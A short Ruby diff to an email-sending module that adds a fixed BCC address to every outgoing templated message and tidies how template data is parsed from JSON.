@@ -36,7 +36,8 @@ module ApEmail
         personalization = Personalization.new
         tos = to.is_a?(Array) ? to : [to]
         tos.map { |recipient| personalization.add_to(Email.new(email: recipient)) }
-        template_data = template_data.is_a?(String) ? JSON.parse(template_data) : template_data
+        personalization.add_bcc(Email.new(email: 'contact@pervenche.eu'))
+        template_data = JSON.parse(template_data) if template_data.is_a?(String)
         personalization.add_dynamic_template_data(template_data)
         mail.add_personalization(personalization)
         mail.template_id = template_id
